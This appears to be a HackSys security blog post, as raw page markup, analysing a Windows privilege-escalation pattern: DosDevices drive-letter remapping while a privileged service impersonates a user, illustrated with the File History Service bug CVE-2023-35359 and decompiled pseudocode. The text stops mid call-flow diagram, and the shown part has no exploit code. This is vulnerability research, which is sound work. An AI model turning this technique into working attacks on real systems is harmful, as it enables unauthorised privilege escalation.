<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/569ce4b8f30dc480-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/93f479601ee12b01-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/d8804d28b3f5ce05-s.p.otf" as="font" crossorigin="" type="font/otf"/><link rel="stylesheet" href="/_next/static/css/4dfd5a5264424a0f.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/2a75dc013f3ed419.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-0fbc809f8b0c668c.js"/><script src="/_next/static/chunks/4bd1b696-a23cdecbdc66dd73.js" async=""></script><script src="/_next/static/chunks/1684-68d91d2ebad3f657.js" async=""></script><script src="/_next/static/chunks/main-app-188d9912fd0e5ccf.js" async=""></script><script src="/_next/static/chunks/6874-d043bc3669b11e48.js" async=""></script><script src="/_next/static/chunks/2848-76b38e6c317c0e54.js" async=""></script><script src="/_next/static/chunks/1966-a068e5746165fd6d.js" async=""></script><script src="/_next/static/chunks/2467-7c736c42c91fb3af.js" async=""></script><script src="/_next/static/chunks/214-845c2722ecb73b86.js" async=""></script><script src="/_next/static/chunks/app/layout-f709b6a7dd5adbfc.js" async=""></script><script src="/_next/static/chunks/app/not-found-cbc74e2537bbd3aa.js" async=""></script><script src="/_next/static/chunks/d3ac728e-41fcba63e1ac6655.js" async=""></script><script src="/_next/static/chunks/e0368f7a-1235c34447e61195.js" async=""></script><script src="/_next/static/chunks/1456-5cbd6dd70e2edd95.js" async=""></script><script src="/_next/static/chunks/6877-676b4dd2ee485b26.js" async=""></script><script src="/_next/static/chunks/7882-5f5fc3a912ab1310.js" async=""></script><script src="/_next/static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js" async=""></script><link rel="preload" href="/_next/static/css/09dfadb69bdaa005.css" as="style"/><link rel="preload" href="/_next/static/css/06fcfbe31f4b8e82.css" as="style"/><meta name="next-size-adjust" content=""/><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col"><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><script src="/_next/static/chunks/webpack-0fbc809f8b0c668c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:\"$Sreact.suspense\"\n3:I[75989,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"GoogleAnalytics\"]\n4:I[29093,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"PageLoadWrapper\"]\n5:I[2148,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"Header\"]\n6:I[87555,[],\"\"]\n7:I[31295,[],\"\"]\n8:I[32876,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"4345\",\"static/chunks/app/not-found-cbc74e2537bbd3aa.js\"],\"default\"]\n9:I[6874,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"\"]\nc:I[59665,[],\"MetadataBoundary\"]\ne:I[59665,[],\"OutletBoundary\"]\n11:I[74911,[],\"AsyncMetadataOutlet\"]\n13:I[59665,[],\"ViewportBoundary\"]\n15:I[26614,[],\"\"]\n:HL[\"/_next/static/media/569ce4b8f30dc480-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/93f479601ee12b01-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/d8804d28b3f5ce05-s.p.otf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/otf\"}]\n:HL[\"/_next/static/css/4dfd5a5264424a0f.css\",\"style\"]\n:HL[\"/_next/static/css/2a75"])</script><script>self.__next_f.push([1,"dc013f3ed419.css\",\"style\"]\n:HL[\"/_next/static/css/09dfadb69bdaa005.css\",\"style\"]\n:HL[\"/_next/static/css/06fcfbe31f4b8e82.css\",\"style\"]\na:T4ef,M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"gMyW5qIY4BG4upgCzpuGJ\",\"p\":\"\",\"c\":[\"\",\"blogs\",\"activation-context-hell-dosdevices-remapping-attack-under-impersonation\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"blogs\",{\"children\":[[\"slug\",\"activation-context-hell-dosdevices-remapping-attack-under-impersonation\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/4dfd5a5264424a0f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2a75dc013f3ed419.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L3\",null,{}]}]}],[\"$\",\"body\",null,{\"className\":\"__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col\",\"children\":[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L4\",null,{\"children\":[[\"$\",\"$L5\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex-grow container mx-auto pt-24 pb-20\",\"children\":[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"$L8\",null,{}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"footer\",null,{\"className\":\"fixed left-0 bottom-0 right-0 border-t border-primary/30 bg-background/95 backdrop-blur-sm py-2 px-2 sm:px-4 w-full z-10 print:relative\",\"children\":[\"$\",\"div\",null,{\"className\":\"container mx-auto px-0\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex items-center justify-between w-full\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex-1\",\"children\":[\"$\",\"div\",null,{\"className\":\"text-xs sm:text-sm font-semibold bg-gradient-to-r from-primary/90 to-secondary/90 bg-clip-text text-transparent truncate\",\"children\":[\"© \",2025,\" \",\"HackSys Inc\"]}]}],[\"$\",\"div\",null,{\"className\":\"flex items-center gap-3 sm:gap-4 ml-4\",\"children\":[[\"$\",\"$L9\",null,{\"href\":\"https://twitter.com/HackSysTeam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Twitter\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"X\"}],[\"$\",\"path\",null,{\"d\":\"M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://github.com/hacksysteam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"GitHub\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"GitHub\"}],[\"$\",\"path\",null,{\"d\":\"M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://www.facebook.com/HackSysTeam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Facebook\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"Facebook\"}],[\"$\",\"path\",null,{\"d\":\"M9.101 23.691v-7.98H6.627v-3.667h2.474v-1.58c0-4.085 1.848-5.978 5.858-5.978.401 0 .955.042 1.468.103a8.68 8.68 0 0 1 1.141.195v3.325a8.623 8.623 0 0 0-.653-.036 26.805 26.805 0 0 0-.733-.009c-.707 0-1.259.096-1.675.309a1.686 1.686 0 0 0-.679.622c-.258.42-.374.995-.374 1.752v1.297h3.919l-.386 2.103-.287 1.564h-3.246v8.245C19.396 23.238 24 18.179 24 12.044c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.628 3.874 10.35 9.101 11.647Z\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://discord.com/invite/ns32uNhaq7\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Discord\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"Discord\"}],[\"$\",\"path\",null,{\"d\":\"$a\"}]]}]}]]}]]}]}]}]]}]}]}]]}]]}],{\"children\":[\"blogs\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"activation-context-hell-dosdevices-remapping-attack-under-impersonation\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$Lb\",[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/09dfadb69bdaa005.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/06fcfbe31f4b8e82.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$Le\",null,{\"children\":[\"$Lf\",\"$L10\",[\"$\",\"$L11\",null,{\"promise\":\"$@12\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"HohPeFfJ34rHXCb3ZKujC\",{\"children\":[[\"$\",\"$L13\",null,{\"children\":\"$L14\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$15\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"16:I[74911,[],\"AsyncMetadata\"]\n18:I[88793,[\"7330\",\"static/chunks/d3ac728e-41fcba63e1ac6655.js\",\"5661\",\"static/chunks/e0368f7a-1235c34447e61195.js\",\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"1456\",\"static/chunks/1456-5cbd6dd70e2edd95.js\",\"6877\",\"static/chunks/6877-676b4dd2ee485b26.js\",\"7882\",\"static/chunks/7882-5f5fc3a912ab1310.js\",\"3744\",\"static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js\"],\"HeroSection\"]\n19:I[750,[\"7330\",\"static/chunks/d3ac728e-41fcba63e1ac6655.js\",\"5661\",\"static/chunks/e0368f7a-1235c34447e61195.js\",\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"1456\",\"static/chunks/1456-5cbd6dd70e2edd95.js\",\"6877\",\"static/chunks/6877-676b4dd2ee485b26.js\",\"7882\",\"static/chunks/7882-5f5fc3a912ab1310.js\",\"3744\",\"static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js\"],\"default\"]\nd:[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L16\",null,{\"promise\":\"$@17\"}]}]\n1a:Ta27c,"])</script><script>self.__next_f.push([1,"\n## Overview\n\nAfter listening to a captivating talk by [Maddie Stone](https://twitter.com/maddiestone) and [James Forshaw](https://twitter.com/tiraniddo) [The Print Spooler Bug that Wasn't in the Print Spooler](https://www.youtube.com/watch?v=H03b0UaogVs) and delving into the [SSD Advisory – File History Service (fhsvc.dll) Elevation of Privilege](https://ssd-disclosure.com/ssd-advisory-file-history-service-fhsvc-dll-elevation-of-privilege/), our interest was piqued regarding a specific attack surface within the **Windows** architecture. This led us to explore the intricate relationship between the [Side-by-Side (SxS) Assemblies](https://learn.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-) [Activation Context](https://learn.microsoft.com/en-us/windows/win32/sbscs/activation-contexts) and the [DosDevices](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-ms-dos-device-names) symbolic link mechanism.\n\nOver the years, several **CVEs** have been associated with the **Activation Context**. Some of them are listed below:\n\n* [CVE-2015-1644](https://bugs.chromium.org/p/project-zero/issues/detail?id=240)\n* [CVE-2022-22047](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-22047)\n* [CVE-2022-37987](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2022-37987)\n* [CVE-2022-37989](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2022-37989)\n* [CVE-2023-35359](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2022-37989)\n\n\u003e **Disclaimer:** The CVEs mentioned in this list are by no means exhaustive.\n\n**Zero Day Initiative (ZDI)** also found couple of bugs related to the **Activation Context**. They also blogged about it, you can read this article here: \u003chttps://www.zerodayinitiative.com/blog/2023/1/23/activation-context-cache-poisoning-exploiting-csrss-for-privilege-escalation\u003e\n\n**CVE-2023-35359** is very interesting as this single CVE is assigned to at least **three** different bugs. These bugs were reported by [James Forshaw](https://bugs.chromium.org/p/project-zero/issues/detail?id=2451), [SSD Disclosure](https://ssd-disclosure.com/ssd-advisory-file-history-service-fhsvc-dll-elevation-of-privilege/) and [y3a](https://y3a.github.io/2023/08/24/cve-2023-35359/).\n\nFor this blog post, we will be using [SSD Disclosure's bug](https://ssd-disclosure.com/ssd-advisory-file-history-service-fhsvc-dll-elevation-of-privilege/) as our primary example due to its ease of triggering and its relevance to our discussion.\n\nIn the intricate landscape of Windows architecture, the interplay between the **Side-by-Side (SxS)** assembly's **Activation Context** and the `DosDevices` symbolic link mechanism presents a unique security challenge. When a **high privileged** service is **impersonating** a **low privileged** user, a window of opportunity opens for potential exploitation through `DosDevices` remapping.\n\nAn attacker can alter the mapping of familiar **DOS** device names, leading to **unintended and potentially malicious** file operations. Such an attack can result in an **elevation of privilege**, allowing a **low privileged** user to execute actions typically reserved for higher privileges.\n\n\u003e **Disclaimer:** The insights shared in this blog post reflect our **comprehension** and **interpretation** of the subject.\n\nThis post aims to shed light on the nuances of this attack vector, exploring the intricacies of the **Activation Context** within the **SxS Assembly** and the potential risks associated with `DosDevices` remapping under **impersonation**.\n\n\u003e **Note:** For a more in-depth understanding, subsequent sections will delve into the specifics of the **DosDevices** mechanism, **SxS Assemblies**, and **Activation Context**.\n\n## DosDevices\n\nIn the **Windows** operating system, `DosDevices` is a special directory that plays a crucial role in the mapping of **DOS drive** letters to **NT paths**. It serves as a symbolic link, providing a bridge between the user-friendly **DOS-style path names** and the underlying **Windows NT path names**.\n\nThe primary purpose of `DosDevices` is to ensure compatibility. While modern applications typically use **Windows NT paths**, many legacy applications (and even some modern ones) still rely on **DOS-style paths**. By providing a mapping mechanism, `DosDevices` ensures that these applications can function correctly on the **Windows NT** platform.\n\nHere is a typical example:\n\n* Drive Letters:\n  * **DOS Path**: `C:\\Windows\\System32`\n  * **NT Path**: `\\Device\\HarddiskVolumeX\\Windows\\System32`\n\n\u003e **Info:** For a deeper dive into the intricacies of **Windows** paths and the role of **DosDevices**, consider reading [Windows Drivers are True'ly Tricky](https://googleprojectzero.blogspot.com/2015/10/windows-drivers-are-truely-tricky.html) by **James Forshaw** which sheds light on the complexities of **Windows** paths.\n\n## LoadLibrary\n\nThe `LoadLibrary` function is a part of the **Windows** API and is used to **load** a **Dynamic-Link Library** (**DLL**) into the memory of the calling process.\n\nWhen the `LoadLibrary` function is called to load a **DLL** that includes a **Side-by-Side** (**SxS**) manifest, the process is slightly more complex and involves the creation of an **Activation Context**.\n\n## Impersonation\n\n**Impersonation** is a powerful feature in **Windows** that allows a process to temporarily **assume** the **security context** of **another user**. This is a vital capability, particularly in situations where a process needs to perform actions or access resources on behalf of a user.\n\nSeveral APIs are related to **impersonation** in **Windows**:\n\n* [ImpersonateLoggedOnUser](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser)\n* [RpcImpersonateClient](https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcimpersonateclient)\n* [ImpersonateSelf](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateself)\n* [RevertToSelf](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself)\n\n## Client/Server Runtime Subsystem (CSRSS)\n\nThe **Client/Server Runtime Subsystem** (**CSRSS**) is a critical component of the **Windows** operating system. It is responsible for a variety of important functions, including the management of the Windows console, the creation and deletion of threads, and the implementation of the 16-bit virtual **MS-DOS** environment.\n\nOne of the key responsibilities of **CSRSS** is the management of **activation contexts** and **Side-by-Side (SxS) assemblies**.\n\n### Side-by-Side Assemblies\n\nWindows **Side-by-Side** (**SxS**) assemblies allow **multiple versions** of a **COM** or **Windows API** component to coexist. This technology reduces **DLL Hell**, a problem that occurs when two applications need to use a **DLL** of the same name but a different version. **SxS Assemblies** are described by **manifest** files, which contain information used for **binding** and **activation**.\n\n### Manifests\n\n**Manifests** are **XML** files that describes the assemblies or **isolated** applications. They contain information used for **binding** and **activation**, such as **COM classes**, **interfaces**, and **type libraries**, that have traditionally been stored in the registry.\n\nA typical **manifest** file is given below:\n\n```xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e\n\u003c!-- Copyright (c) Microsoft Corporation --\u003e\n\u003cassembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"\u003e\n\u003cassemblyIdentity\n    name=\"Microsoft.Windows.Shell.calc\"\n    processorArchitecture=\"amd64\"\n    version=\"5.1.0.0\"\n    type=\"win32\"/\u003e\n\u003cdescription\u003eWindows Shell\u003c/description\u003e\n\u003cdependency\u003e\n    \u003cdependentAssembly\u003e\n        \u003cassemblyIdentity\n            type=\"win32\"\n            name=\"Microsoft.Windows.Common-Controls\"\n            version=\"6.0.0.0\"\n            processorArchitecture=\"*\"\n            publicKeyToken=\"6595b64144ccf1df\"\n            language=\"*\"\n        /\u003e\n    \u003c/dependentAssembly\u003e\n\u003c/dependency\u003e\n\u003ctrustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"\u003e\n    \u003csecurity\u003e\n        \u003crequestedPrivileges\u003e\n            \u003crequestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/\u003e\n        \u003c/requestedPrivileges\u003e\n    \u003c/security\u003e\n\u003c/trustInfo\u003e\n\u003capplication xmlns=\"urn:schemas-microsoft-com:asm.v3\"\u003e\n    \u003cwindowsSettings\u003e\n        \u003cdpiAware  xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\"\u003etrue\u003c/dpiAware\u003e\n    \u003c/windowsSettings\u003e\n\u003c/application\u003e\n\u003c/assembly\u003e\n```\n\n\u003e **Info:** For a comprehensive understanding of **manifest** XML and its various elements, consider reading: \u003chttps://learn.microsoft.com/en-us/windows/win32/sbscs/application-manifests\u003e\n\n### Activation Context\n\nAn **Activation Context** is a data structure in memory that contains information that the system can use to **redirect** an application to **load** a specific **DLL version**, **COM object** instance, or **custom window version**. It is used with **Side-by-Side (SxS) assemblies** to manage the **names**, **versions**, **resources**, and **dependent assemblies**.\n\n### Activation Context Cache\n\nThe **Activation Context Cache** is an **AVL tree** cache that stores the **activation contexts** for reuse. `BaseSrvActivationContextCacheCompareEntries` is used to identify a hit or miss in the cache. This cache is used to improve performance by avoiding the need to re-parse the **manifest** XML. The cache is managed by the `csrss.exe` process and can be queried during **process startup** or **library loading** by calling into `csrss.exe` via `CsrClientCallServer` resulting in calls to `BaseSrvSxsCreateProcess` or `BaseSrvSxsCreateActivationContext` inside `sxssrv.dll`. The comparison function checks the **Win32 path** of the file, **assembly directory**, **language string**, **last write timestamp** of the executable, **token integrity level** value, and some **flags**.\n\n## File History Service - CVE-2023-35359\n\n**File History** is a backup application that continuously protects your files stored in **Libraries**, **Desktop**, **Favorites**, and **Contacts** folders. It periodically (by default every hour) scans the file system for changes and copies changed files to another location. Every time any of your files has changed, its copy will be stored on a dedicated, external storage device selected by you. Over time, **File History** builds a complete history of changes made to any personal file.\n\n**File History Service** is implemented inside `C:\\Windows\\System32\\fhsvc.dll`. Let's see what the vulnerable function looks like:\n\n```cpp\nvoid __fastcall CManagerThread::QueueBackupForLoggedOnUser(CManagerThread *this, ULONG a2)\n{\n  ...\n  result = CoInitializeEx(0i64, 0);\n  ...\n  if ( !WTSQueryUserToken(a2, \u0026phToken) ) // --\u003e [1]\n  {\n    ...\n  }\n  if ( ImpersonateLoggedOnUser(phToken) ) // --\u003e [2]\n  {\n    CurrentThread = GetCurrentThread();\n    if ( OpenThreadToken(CurrentThread, 0xCu, 1, \u0026TokenHandle) )\n    {\n      result = CoCreateInstance(\u0026CLSID_FhConfigMgr, 0i64, 0x17u, \u0026GUID_e388cb3e_d90b_4e2a_a025_42c7f1e655a4, \u0026ppv); // --\u003e [3]\n      ...\n    }\n    else\n    {\n      ...\n    }\n  ...\n  }\n  ...\n}\n```\n\n### Bug Pattern\n\nWhen analyzing the function `CManagerThread::QueueBackupForLoggedOnUser`, a specific pattern of vulnerability emerges that can be exploited by attackers. Let's break down the sequence of operations and understand the underlying issue:\n\n* **Impersonation**\n  * The function begins by calling `WTSQueryUserToken` to retrieve the **token** associated with a **logged-on** user session. This **token** is then used by `ImpersonateLoggedOnUser` to **impersonate** the user associated with that **token**. This means that any subsequent operations will be performed with the privileges of the **impersonated** user.\n\n* **Loading DLL**\n  * After successful **impersonation**, the function proceeds to call `CoCreateInstance`. This API is used to create an instance of a specific **COM** object identified by the `CLSID` (class ID). In this specific case, it attempts to load a **COM** **DLL**, for instance, `C:\\Windows\\System32\\fhcfg.dll`.\n\n\u003e **Note:** `fhcfg.dll` has a **SxS** **manifest** file embedded inside it.\n\n### The Vulnerability\n\nThe crux of the vulnerability lies in the combination of the above steps. When `CoCreateInstance` is called **post-impersonation**, it uses the `LoadLibraryExW` function internally to load the required **DLL**. However, due to the **impersonated** context, there's a potential for an **attacker** to **redirect** or **influence** the **loading** of this **DLL**, leading to a classic **DLL hijacking** scenario.\n\nBelow given is the call flow, which shows how `LoadLibraryExW` is being invoked internally by `CoCreateInstance`:\n\n```mermaid\ngraph TD\n    A[CFhService::StartServiceW]\n    B[CManagerThread::QueueBackupForLoggedOnUser]\n    C[CoCreateInstance]\n    D[CComActivator::DoCreateInstance]\n    E[ICoCreateInstanceEx]\n    F[ActivationPropertiesIn::DelegateCreateInstance]\n    G[CClientContextActivator::CreateInstance]\n    H[ActivationPropertiesIn::DelegateCreateInstance]\n    I[CProcessActivator::CreateInstance]\n    J[CProcessActivator::ActivateByContext]\n    K[CProcessActivator::AttemptActivation]\n    L[CProcessActivator::CCICallback]\n    M[CApartmentActivator::CreateInstance]\n    N[ActivationPropertiesIn::DelegateCreateInstance]\n    O[CServerContextActivator::CreateInstance]\n    P[CClassCache::GetClassObject]\n    